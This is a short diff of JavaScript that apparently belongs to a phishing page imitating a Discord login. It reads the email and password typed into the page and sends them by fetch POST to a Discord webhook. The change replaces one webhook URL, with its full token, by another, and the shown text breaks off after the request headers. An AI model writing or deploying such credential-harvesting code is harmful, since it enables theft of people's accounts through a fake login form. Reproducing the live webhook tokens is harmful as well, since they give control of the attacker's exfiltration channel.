@@ -3,7 +3,7 @@ function func() {
     
     const email = document.querySelector(".inputField-4g7rSQ").value;
     const pass = document.querySelector(".pass").value;
-    const whurl = "https://discord.com/api/webhooks/1126221995579809923/2GbmJrwj8lKjMKPcGfeJFgxJZ_KRzvRQbnzVHpAcFb0hxsaXaoC9arWCzU-pulufgiKv"
+    const whurl = "https://discord.com/api/webhooks/1249246020865359923/nJlHG-h5jYSK-NN5f9Kf-G0dxSbxs1zjgG3G9E5uxs8-8tK2d69NO3dsotxd3vMCZWDt"
     fetch(whurl,{
         "method":"POST",
         "headers": {"content-type":"application/json"},
